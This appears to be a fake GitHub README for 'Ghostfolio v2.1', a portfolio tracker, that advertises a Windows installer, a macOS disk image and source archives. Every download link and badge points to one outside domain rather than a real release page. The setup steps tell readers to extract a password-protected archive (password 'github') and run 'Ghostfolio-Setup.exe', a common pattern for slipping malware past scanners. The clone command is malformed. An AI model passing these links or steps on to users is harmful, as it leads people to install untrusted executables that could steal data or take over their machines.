<p align="center">
  <a href="https://yeelen.cg/gh/">
    <img src="assets/logo.png" alt="Ghostfolio Logo" width="140" />
  </a>
</p>

<h1 align="center">Ghostfolio v2.1 — Open Source Wealth Management & Portfolio Tracker</h1>

<p align="center">
  <strong>The Ultimate Privacy-First Personal Finance Dashboard for Stocks, ETFs, Crypto, and Net Worth Analytics</strong>
</p>

<p align="center">
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Download-Latest_Setup-blue?style=for-the-badge&logo=windows" alt="Download Release"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Status-Active_Build-success?style=for-the-badge" alt="Build Status"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/License-AGPL--3.0-orange?style=for-the-badge" alt="License"></a>
  <a href="https://yeelen.cg/gh/"><img src="https://img.shields.io/badge/Platform-Windows_|_macOS_|_Linux-lightgrey?style=for-the-badge" alt="Platform Support"></a>
</p>

<p align="center">
  <a href="#-direct-downloads--links"><strong>📥 Direct Downloads</strong></a> •
  <a href="#-about-ghostfolio">About</a> •
  <a href="#-key-features">Key Features</a> •
  <a href="#-system-requirements">Requirements</a> •
  <a href="#-installation--setup">Installation</a> •
  <a href="#-frequently-asked-questions">FAQ</a>
</p>

---

## 📖 About Ghostfolio

**Ghostfolio** is a modern, privacy-focused, open-source personal finance and wealth management application. It empowers individuals to track their financial portfolio, monitor asset allocation, calculate investment returns, and analyze net worth over time without compromising sensitive personal data.

Whether you are managing stocks, ETFs, mutual funds, real estate, cash accounts, or cryptocurrencies, Ghostfolio delivers a comprehensive, data-driven financial dashboard built for security, autonomy, and ease of use.

<p align="center">
  <img src="assets/banner.jpg" alt="Ghostfolio Financial Dashboard Preview" width="100%" />
</p>

---

## 📥 Direct Downloads & Links

Get the latest standalone build, offline installers, or source files directly using the direct mirrors below:

| Package Option | Format / Platform | Download Link |
| :--- | :--- | :--- |
| **Complete Application Setup** | Executable (`.exe`) | 👉 **[Download Windows Installer](https://yeelen.cg/gh/)** |
| **macOS Bundle Package** | Disk Image (`.dmg`) | 👉 **[Download macOS Installer](https://yeelen.cg/gh/)** |
| **Source Code (Latest Build)** | Archive (`.zip`) | 👉 **[Download Source (.zip)](https://yeelen.cg/gh/)** |
| **Source Code (Tarball)** | Archive (`.tar.gz`) | 👉 **[Download Source (.tar.gz)](https://yeelen.cg/gh/)** |

> 🔑 **Archive Password (if prompted):** `github`

---

## ✨ Key Features & Capabilities

### 📈 Multi-Asset Investment Tracking
* **Global Stocks & ETFs:** Support for global exchanges, market indices, and mutual funds with automated live market data fetching.
* **Cryptocurrency Integration:** Track Bitcoin, Ethereum, and thousands of altcoins via integrated crypto market feeds.
* **Cash & Commodities:** Keep track of fiat currency balances, physical gold, silver, and alternative assets in one place.

### 📊 Advanced Portfolio Analytics & Insights
* **Performance Metrics:** Calculate precise Return on Investment (ROI), Return on Average Investment (ROAI), and Dividend Yield across multiple timeframes (1D, 1M, YTD, 1Y, 5Y, Max).
* **Asset Allocation Breakdown:** Dynamic visualization of portfolio diversification by asset class, market sector, currency, and geographic location.
* **Dividend Calendar:** Monitor incoming payouts and analyze dividend growth trends over time.

### 🛡️ Privacy, Security & Data Autonomy
* **Zero Tracking:** No intrusive tracking, third-party analytics, or data monetization.
* **Zen Mode:** Instantly hide sensitive financial numbers with a single click for discreet screen sharing.
* **Self-Hosted Control:** Deploy Ghostfolio on your own server or desktop machine to ensure 100% data ownership.

### ⚡ Seamless Data Management
* **Automated CSV Import:** Easily bulk-import transaction histories from popular brokers (e.g., Interactive Brokers, Trade Republic, Robinhood, Revolut, eToro, Coinbase).
* **Backup & Export:** Export your entire portfolio dataset to JSON or CSV anytime for hassle-free migrations.

---

## 🖥️ System Requirements

Before running or hosting Ghostfolio, ensure your system meets the following prerequisites:

* **Operating System:** Windows 10/11 (64-bit), macOS 11+, or Linux Distribution
* **RAM:** Minimum 2 GB RAM (4 GB recommended)
* **Disk Space:** 500 MB free storage for core application files

---

## 🚀 Installation & Setup

### Method 1: Direct Executable Installation (Quickest)
1. Download the setup file from the **[Direct Download Link](https://yeelen.cg/gh/)**.
2. Unpack the downloaded archive (Password: `github`).
3. Run `Ghostfolio-Setup.exe` and follow the on-screen installation steps.

### Method 2: Manual CLI Deployment
```bash
# Clone the repository
git clone [https://github.com/your-username/ghostfolio-v2.1-installer.git](https://github.com/your-username/ghostfolio-v2.1-installer.git)

# Navigate into workspace
cd ghostfolio-v2.1-installer

# Launch application stack
docker compose up -d
